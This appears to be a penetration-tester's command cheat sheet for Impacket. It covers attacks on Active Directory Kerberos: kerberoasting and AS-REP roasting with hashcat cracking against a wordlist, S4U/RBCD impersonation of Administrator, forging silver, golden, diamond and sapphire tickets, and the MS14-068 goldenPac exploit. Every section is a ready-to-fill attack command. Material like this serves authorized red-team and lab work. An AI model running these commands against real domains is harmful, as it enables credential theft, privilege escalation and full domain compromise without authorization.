# impacket
#target/remote #os/linux #cat/ad

## gettgt
#faketime
```
getTGT.py <domain>/'<user>'<impacket_auth> && export KRB5CCNAME=$(pwd)/'<user>'.ccache
```

## kerberoast
#faketime
```
GetUserSPNs.py -request -outputfile hashes.kerberoast <domain>/'<user>'<impacket_auth>
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## kerberoast with no-preauth user
#faketime
```
GetUserSPNs.py -request -no-preauth <no_preauth_user> -usersfile <userlist|users.txt> -outputfile hashes.kerberoast <domain>/
hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force
```

## asreproast with usersfile
#faketime
```
GetNPUsers.py -usersfile <userlist|users.txt> -outputfile hashes.asreproast <domain>/
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## asreproast with authentication
#faketime
```
GetNPUsers.py -request -outputfile hashes.asreproast <domain>/'<user>'<impacket_auth>
hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force
```

## kcd/rbcd (principal requires spn!)
#faketime
```
getST.py -spn <service|cifs>/<fqdn> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
```

## s4u2self
#faketime
```
getST.py -self -altservice <service|cifs>/<fqdn> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
```

## s4u2proxy
#faketime
```
getST.py -spn <service|cifs>/<fqdn> -additional-ticket <ticket_file> -impersonate <imp_user|Administrator> <domain>/'<user>'<impacket_auth>
```

## ticketer silver ticket
#faketime
```
ticketer.py -nthash <service_nt_hash> -domain-sid <domain_sid> -domain <domain> -spn <spn> '<user>'
```

## ticketer golden ticket
#faketime
```
ticketer.py -nthash <krbtgt_nt_hash> -domain-sid <domain_sid> -domain <domain> '<user>'
```

## ticketer diamond ticket
#faketime
```
ticketer.py -request -domain <domain> -user '<user>' -password '<password>' -nthash <nt_hash> -aesKey <aes_key> -domain-sid <domain_sid> -user-id <user_id> -groups <groups> <target_user>
```

## ticketer sapphire ticket
#faketime
```
ticketer.py -aesKey <principal_krbtgt_aes_key> -domain <principal_domain> -domain-sid <principal_domain_sid> -extra-sid <target_domain_sid>-519 Administrator
```

## ms14-068 - goldenpac
#faketime
```
goldenPac.py -dc-ip <dc_ip> <domain>/'<user>'<impacket_target_auth>
```

## export krb5ccname
```
export KRB5CCNAME=$(pwd)/<ccache>
```
